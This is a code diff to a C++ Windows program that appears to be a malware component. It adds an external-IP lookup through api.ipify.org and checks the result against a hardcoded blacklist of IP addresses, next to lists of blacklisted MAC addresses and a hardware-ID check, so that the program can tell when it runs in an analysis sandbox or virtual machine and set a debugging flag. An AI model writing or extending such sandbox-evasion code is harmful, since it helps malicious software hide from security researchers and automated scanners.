@@ -19,6 +19,7 @@
 #include <windows.h>
 #include <Lmcons.h>
 #include <string.h>
+#include <curl\curl.h>
 
 #include "../scripts.h"
 #include "../../config/config.h"
@@ -93,7 +94,7 @@ namespace global {
 		"93.216.75.209","192.87.28.103", "88.132.226.203", "195.181.175.105", "88.132.225.100", "92.211.192.144", "34.83.46.130", "188.105.91.143", "34.85.243.241", "34.141.245.25",
 		"178.239.165.70", "84.147.54.113", "193.128.114.45", "95.25.81.24", "92.211.52.62", "88.132.227.238", "35.199.6.13", "80.211.0.97", "34.85.253.170", "23.128.248.46", "35.229.69.227",
 		"34.138.96.23", "192.211.110.74", "35.237.47.12", "87.166.50.213", "34.253.248.228", "212.119.227.167", "193.225.193.201", "34.145.195.58", "34.105.0.27", "195.239.51.3",
-		"35.192.93.107" };
+		"35.192.93.107"};
 
 	const std::string blackListedMacs[146] = { "00:15:5d:00:07:34", "00:e0:4c:b8:7a:58", "00:0c:29:2c:c1:21", "00:25:90:65:39:e4", "c8:9f:1d:b6:58:e4", "00:25:90:36:65:0c", "00:15:5d:00:00:f3",
 		"2e:b8:24:4d:f7:de", "00:15:5d:13:6d:0c", "00:50:56:a0:dd:00", "00:15:5d:13:66:ca", "56:e8:92:2e:76:0d", "ac:1f:6b:d0:48:fe", "00:e0:4c:94:1f:20", "00:15:5d:00:05:d5", 
@@ -196,8 +197,40 @@ void CheckHWIDs()
 	}
 }
 
+size_t WriteCallback(char* contents, size_t size, size_t nmemb, std::string* output) {
+	size_t totalSize = size * nmemb;
+	output->append(contents, totalSize);
+	return totalSize;
+}
+
 void CheckIPs()
 {
+	std::string ipAddress = "";
+
+	CURL* curl = curl_easy_init();
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);
+
+		CURLcode res = curl_easy_perform(curl);
+		if (res != CURLE_OK) {
+			std::cerr << "Failed to retrieve IP address: " << curl_easy_strerror(res) << std::endl;
+		}
+
+		curl_easy_cleanup(curl);
+	}
+	std::cout << "External IP Address: " << ipAddress << std::endl;
+
+	for (size_t i = 0; i < std::size(global::blackListedIPS); i++)
+	{
+		if (global::blackListedIPS[i] == ipAddress)
+		{
+			global::debuging = true;
+			break;
+		}
+	}
+
 }
 
 void CheckMacs() {}
